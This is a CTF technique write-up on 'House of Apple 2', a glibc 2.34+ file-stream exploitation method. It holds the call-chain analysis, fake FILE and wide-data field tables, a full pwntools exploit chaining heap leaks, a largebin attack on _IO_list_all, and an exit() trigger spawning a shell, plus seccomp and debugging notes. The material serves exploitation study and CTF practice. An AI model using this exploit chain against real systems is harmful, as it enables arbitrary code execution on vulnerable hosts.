---
title: "House of Apple - FSOP for glibc 2.34+ via _IO_wfile_jumps"
category: pwn
subcategory: heap
type: technique
tags: [house-of-apple, fsop, io-file, io-wfile-jumps, wide-data, wide-vtable, io-list-all, largebin-attack, stdout, exit, setcontext, pwntools, pwndbg, gef, glibc]
difficulty: insane
summary: "Point a fake FILE's vtable at the real _IO_wfile_jumps and its _wide_data at your own memory; the unchecked wide vtable gives you a call with rdi under control."
when_to_use:
  - "glibc 2.34+ removed __free_hook / __malloc_hook and you need a call primitive"
  - "You can write a heap pointer over `_IO_list_all` or `stdout` (largebin attack)"
  - "The program calls exit(), or any printf/puts you can reach after the corruption"
  - "House of orange fails with 'invalid stdio handle' because of the 2.24 vtable check"
tools: [pwntools, pwndbg, gef, one-gadget, seccomp-tools]
related: [heap-fsop-file-struct, house-orange, heap-largebin-attack, heap-setcontext-pivot, heap-write-targets]
---

## TL;DR

`IO_validate_vtable` only checks `fp->vtable`. It does **not** check
`fp->_wide_data->_wide_vtable`. So point `vtable` at the genuine `_IO_wfile_jumps`
(which passes) and `_wide_data` at a heap chunk you own; `_IO_wfile_overflow` ->
`_IO_wdoallocbuf` then calls `_wide_data->_wide_vtable->__doallocate(fp)` with
`rdi = fp`. Put `"  /bin/sh"` at `fp+0` and `system` at `wide_vtable+0x68`.

## Recognise it

- glibc 2.34 or newer: `nm -D libc.so.6 | grep __free_hook` returns nothing.
- Full RELRO, so no GOT.
- You have a largebin attack or an arbitrary write plus a heap leak.
- The menu ends with `exit(0)`, or the program prints something after you corrupt
  `stdout`.

## Vulnerable code shape

You arrive here with a capability, not a bug:

```c
/* (a) largebin attack: a heap pointer written to an address you chose */
*(void **)&_IO_list_all = my_heap_chunk;

/* (b) tcache poisoning: an allocation placed over _IO_2_1_stdout_ */
char *p = malloc(0xe8);        /* returns &_IO_2_1_stdout_ */
read(0, p, 0xe8);              /* rewrite the whole FILE in place */

/* and then, eventually */
exit(0);                       /* -> _IO_cleanup -> _IO_flush_all_lockp */
```

## Theory

Targets: glibc 2.24 - 2.39 (the vtable check exists from 2.24; the technique is most
useful from 2.34 when the hooks disappeared).

### The call chain

```c
/* libio/wfileops.c */
wint_t _IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES)            /* 0x8 must be clear */
    { f->_flags |= _IO_ERR_SEEN; return WEOF; }

  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0    /* 0x800 clear ... */
      || f->_wide_data->_IO_write_base == NULL)   /* ... or write_base NULL */
    {
      if (f->_wide_data->_IO_buf_base == NULL)    /* must be NULL */
        _IO_wdoallocbuf (f);
      ...
    }
  ...
}

/* libio/wgenops.c */
void _IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base) return;
  if (!(fp->_flags & _IO_UNBUFFERED))               /* 0x2 must be clear */
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)       /* THE CALL */
      return;
  ...
}
```

`_IO_WDOALLOCATE(fp)` expands to
`(*(struct _IO_jump_t **)((void*)&fp->_wide_data->_wide_vtable))->__doallocate(fp)`,
i.e.

```
call  *( *(fp + 0xA0) + 0xE0 ) + 0x68 )       with rdi = fp
      ^ _wide_data          ^ _wide_vtable   ^ __doallocate
```

No validation on either dereference.

### The two ways in

**(a) `_IO_list_all` (needs only a heap-pointer write).**
`exit()` -> `_IO_cleanup` -> `_IO_flush_all_lockp` walks `_IO_list_all` and calls
`_IO_OVERFLOW(fp, EOF)` = `*(fp->vtable + 0x18)(fp, EOF)` on every FILE that satisfies
the flush condition. With `vtable = _IO_wfile_jumps`, `vtable + 0x18` is
`_IO_wfile_overflow`. This is the largebin-attack finish.

**(b) `_IO_2_1_stdout_` in place (needs an arbitrary write of ~0xE0 bytes).**
Rewrite the real `stdout` struct. The next `printf`/`puts`/`exit` triggers the same
chain. Slightly easier because you do not need to control `_IO_list_all`.

**(c) `stdout->_chain`.** Leave `stdout` alone but set its `_chain` to your fake FILE.
`_IO_flush_all_lockp` walks the chain, so your FILE is reached on `exit()` without
touching `_IO_list_all`.

### The field checklist

FILE (at `FAKE`):

| offset | field | value |
|--------|-------|-------|
| 0x00 | `_flags` | `u64(b"  /bin/sh")` - must have 0x8, 0x800 and 0x2 clear |
| 0x20 | `_IO_write_base` | 0 |
| 0x28 | `_IO_write_ptr` | 1 (must be `>` write_base for the narrow trigger) |
| 0x68 | `_chain` | 0 |
| 0x88 | `_lock` | a writable, zeroed address |
| 0xA0 | `_wide_data` | `&FAKE_WIDE` |
| 0xC0 | `_mode` | 0 (narrow trigger) |
| 0xD8 | `vtable` | `libc.sym['_IO_wfile_jumps']` |

`_flags = u64(b"  /bin/sh")` = `0x68732f6e69622f20`. Check the low bits:
`0x20 & 0x8 == 0`, `0x20 & 0x2 == 0`, `0x20 & 0x800 == 0`. All clear. Good.

`_IO_wide_data` (at `FAKE_WIDE`):

| offset | field | value |
|--------|-------|-------|
| 0x18 | `_IO_write_base` | 0 |
| 0x20 | `_IO_write_ptr` | 0 (only matters for the wide trigger) |
| 0x30 | `_IO_buf_base` | 0 - **must be NULL** |
| 0xE0 | `_wide_vtable` | `&FAKE_WVT` |

Fake wide vtable (at `FAKE_WVT`): `__doallocate` at offset **0x68** = `system`
(or the `setcontext` magic gadget for a seccomp'd challenge).

### House of Apple 1 vs 2 vs 3

- **Apple 1**: uses `_IO_wstrn_jumps` / `_IO_str_jumps` and their `_allocate_buffer`
  pointer. Mostly dead in modern glibc.
- **Apple 2**: the `_IO_wfile_jumps` + `_wide_data` chain above. This is the one
  everybody means.
- **Apple 3**: `_IO_wfile_jumps` `_IO_wfile_seekoff` / `_IO_switch_to_wget_mode` path,
  used when the `_IO_wdoallocbuf` conditions cannot all be met. Same idea, different
  entry function.

## Attack

glibc 2.35, largebin attack available, no seccomp.

1. Leak libc (unsorted bin) and the heap (tcache `next` on a lone entry).
2. Allocate a 0x300+ chunk `FAKE` and note its address.
3. Build inside it:
   - `FAKE + 0x000`: the FILE, per the table above, with
     `_wide_data = FAKE + 0x100`, `vtable = _IO_wfile_jumps`.
   - `FAKE + 0x100`: the `_IO_wide_data`, with `_wide_vtable = FAKE + 0x200`.
   - `FAKE + 0x200`: the wide vtable, `system` at `+0x68`.
   - `_lock` -> any zeroed writable address, e.g. `FAKE + 0x2F0`.
4. Perform a largebin attack that writes `FAKE` into `_IO_list_all`.
   (See `heap-largebin-attack`: `bk_nextsize = _IO_list_all - 0x20`.)
5. Trigger `exit()`.
6. `_IO_flush_all_lockp` picks up `FAKE` (because `_IO_write_ptr(1) >
   _IO_write_base(0)` and `_mode <= 0`), calls `_IO_wfile_overflow(FAKE, EOF)`,
   which calls `_IO_wdoallocbuf(FAKE)`, which calls
   `FAKE_WVT->__doallocate(FAKE)` = `system("  /bin/sh")`.

## Heap state

```text
FAKE = 0x55a1b2c04500

 +0x000 | _flags = "  /bin/sh"        |  <- also rdi for system()
 +0x020 | _IO_write_base = 0          |
 +0x028 | _IO_write_ptr  = 1          |  <- 1 > 0, so flush_all selects it
 +0x068 | _chain = 0                  |
 +0x088 | _lock  = 0x55a1b2c047f0     |  <- zeroed, writable
 +0x0a0 | _wide_data = 0x55a1b2c04600 |
 +0x0c0 | _mode = 0                   |
 +0x0d8 | vtable = _IO_wfile_jumps    |  <- REAL libc vtable: passes validation

FAKE_WIDE = 0x55a1b2c04600

 +0x018 | _IO_write_base = 0          |
 +0x030 | _IO_buf_base   = 0          |  <- NULL: forces _IO_wdoallocbuf
 +0x0e0 | _wide_vtable = 0x...04700   |  <- NOT validated

FAKE_WVT = 0x55a1b2c04700

 +0x068 | __doallocate = system       |  <- the call target

libc:
  _IO_list_all --(largebin attack)--> FAKE

exit()
 -> _IO_cleanup -> _IO_flush_all_lockp
      fp = FAKE
      _mode(0) <= 0 && _IO_write_ptr(1) > _IO_write_base(0)     -> selected
      _IO_OVERFLOW(fp,EOF) = *(_IO_wfile_jumps + 0x18)(fp, EOF)
                           = _IO_wfile_overflow(FAKE, EOF)
          _flags & 0x8 == 0                                     ok
          _wide_data->_IO_buf_base == NULL  -> _IO_wdoallocbuf(FAKE)
              _flags & 0x2 == 0                                 ok
              *( *(FAKE+0xa0) + 0xe0 ) + 0x68 )(FAKE)
              = system(FAKE)          rdi = "  /bin/sh"
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Apple 2 - glibc 2.34+ FSOP with no hooks.

Builds the FILE / _IO_wide_data / wide vtable triple, stages them in one heap
chunk, and points _IO_list_all at the FILE with a largebin attack.

Usage:
    ./exploit.py
    ./exploit.py STDOUT          # rewrite _IO_2_1_stdout_ in place instead
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

F = {"_flags": 0x00, "_IO_write_base": 0x20, "_IO_write_ptr": 0x28,
     "_chain": 0x68, "_fileno": 0x70, "_lock": 0x88, "_wide_data": 0xA0,
     "_mode": 0xC0, "vtable": 0xD8}
W = {"_IO_write_base": 0x18, "_IO_write_ptr": 0x20, "_IO_buf_base": 0x30,
     "_wide_vtable": 0xE0}
WVT_DOALLOCATE = 0x68

BINSH_FLAGS = u64(b"  /bin/sh")          # doubles as the system() argument


def blob(fields, size):
    buf = bytearray(size)
    for off, val in fields.items():
        raw = p64(val) if isinstance(val, int) else val
        assert off + len(raw) <= size
        buf[off:off + len(raw)] = raw
    return bytes(buf)


def build_apple2(wide_data_addr, wide_vt_addr, lock_addr, vtable, call_target):
    """Return the three blobs: FILE (0xe0), _IO_wide_data (0xe8), wide vtable (0x70)."""
    assert BINSH_FLAGS & 0x8 == 0, "_IO_NO_WRITES must be clear"
    assert BINSH_FLAGS & 0x2 == 0, "_IO_UNBUFFERED must be clear"
    assert BINSH_FLAGS & 0x800 == 0, "_IO_CURRENTLY_PUTTING must be clear"
    fp = blob({
        F["_flags"]: BINSH_FLAGS,
        F["_IO_write_base"]: 0,
        F["_IO_write_ptr"]: 1,
        F["_chain"]: 0,
        F["_lock"]: lock_addr,
        F["_wide_data"]: wide_data_addr,
        F["_mode"]: 0,
        F["vtable"]: vtable,
    }, 0xE0)
    wd = blob({
        W["_IO_write_base"]: 0,
        W["_IO_write_ptr"]: 0,
        W["_IO_buf_base"]: 0,
        W["_wide_vtable"]: wide_vt_addr,
    }, 0xE8)
    wvt = blob({WVT_DOALLOCATE: call_target}, 0x70)
    return fp, wd, wvt


io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00")[:8])


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


# ------------------------------------------------------------------- leaks
alloc(0, 0x438, b"L")
alloc(1, 0x18, b"g1")
alloc(2, 0x428, b"V")
alloc(3, 0x18, b"g2")
free(0)
arena = show(0)
libc.address = arena - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

alloc(9, 0x28, b"h")
free(9)
heap_page = show(9) << 12
log.success("heap page = %#x", heap_page)

# ---------------------------------------------------------- stage the FILE
FAKE_OFF = 0xA00                       # measure once with vis_heap_chunks
FAKE = heap_page + FAKE_OFF
WIDE = FAKE + 0x100
WVT = FAKE + 0x200
LOCK = FAKE + 0x2F0

fp, wd, wvt = build_apple2(
    wide_data_addr=WIDE,
    wide_vt_addr=WVT,
    lock_addr=LOCK,
    vtable=libc.sym["_IO_wfile_jumps"],
    call_target=libc.sym["system"],
)

payload = bytearray(0x300)
payload[0x000:0x0E0] = fp
payload[0x100:0x1E8] = wd
payload[0x200:0x270] = wvt
alloc(4, 0x2F8, bytes(payload))
log.info("fake FILE staged at %#x", FAKE)

# --------------------------------------- put FAKE into the FILE chain
if args.STDOUT:
    # Alternative: tcache-poison an allocation over _IO_2_1_stdout_ and
    # rewrite it in place. Shown here as the write you must perform.
    log.info("write the FILE blob over %#x (_IO_2_1_stdout_)",
             libc.sym["_IO_2_1_stdout_"])
else:
    # Largebin attack: victim->bk_nextsize = _IO_list_all - 0x20
    alloc(5, 0x448, b"sorter")          # sorts L into the largebin
    free(2)                             # V -> unsorted
    edit(2, p64(arena) + p64(arena) + p64(0)
         + p64(libc.sym["_IO_list_all"] - 0x20))
    alloc(6, 0x448, b"trigger")         # inserts V -> writes &V to _IO_list_all
    log.success("_IO_list_all now points into the heap")
    # If &V is not FAKE, stage the FILE inside V instead - adjust FAKE_OFF.

# ------------------------------------------------------------- detonate
menu(5)                                 # exit()
io.interactive()
```

## Variants & pitfalls

- **`_lock` must be zeroed writable memory.** `_IO_flush_all_lockp(1)` acquires it
  first. A non-zero value makes the process spin or crash before your call.
- **`_flags` low bits.** `_IO_NO_WRITES (0x8)`, `_IO_UNBUFFERED (0x2)` and
  `_IO_CURRENTLY_PUTTING (0x800)` must be clear. `"  /bin/sh"` satisfies all three
  because its first byte is `0x20`.
- **`_wide_data->_IO_buf_base` must be NULL**, otherwise `_IO_wdoallocbuf` returns
  immediately.
- **The largebin attack writes `&victim` (the chunk address), not the user address.**
  If `_IO_list_all` ends up pointing at `victim` rather than your staged `FAKE`, build
  the FILE *inside* `victim` and shift everything by 0x10.
- **Seccomp.** If `execve` is blocked, set `__doallocate` to the `setcontext` magic
  gadget (`mov rdx, [rdi+8] ; call [rdx+0x20]`) and put a fake ucontext in the FILE -
  `rdi` is already the FILE. See `heap-setcontext-pivot`.
- **`exit()` may not be reachable.** Use the `stdout` variant so a `printf` triggers it,
  or corrupt `stdout->_chain`.
- **`_IO_wfile_jumps` vs `_IO_wfile_jumps_mmap`.** Use the plain symbol.
- **2.36+ `_IO_cleanup` changes.** Some builds call `_IO_flush_all` rather than
  `_IO_flush_all_lockp`; behaviour is the same for this chain, but set a breakpoint and
  confirm.

## Debugging

```text
pwndbg> p &_IO_wfile_jumps
pwndbg> p &__libc_IO_vtables
pwndbg> p _IO_list_all
pwndbg> p *(struct _IO_FILE_plus*)<FAKE>
pwndbg> p *(struct _IO_wide_data*)<WIDE>
pwndbg> b _IO_flush_all_lockp
pwndbg> b _IO_wfile_overflow
pwndbg> b _IO_wdoallocbuf
pwndbg> x/gx <WIDE>+0xe0
pwndbg> x/gx <WVT>+0x68
```

```bash
# Confirm the symbol exists and the hooks do not.
nm -D ./libc.so.6 | grep -E '_IO_wfile_jumps|__free_hook'
# Confirm execve is allowed before choosing system().
seccomp-tools dump ./chal
```

## Tools

- `pwndbg` + `libc6-dbg` for `p *(struct _IO_wide_data*)`.
- `seccomp-tools` to decide between `system` and a `setcontext` pivot.
- `one_gadget` as a fallback call target.

## References

- glibc `libio/wfileops.c` (`_IO_wfile_overflow`), `libio/wgenops.c`
  (`_IO_wdoallocbuf`), `libio/libioP.h` (`_IO_WDOALLOCATE`, `IO_validate_vtable`).
- The "House of Apple" series was published by roderick01 on the Chinese CTF scene.
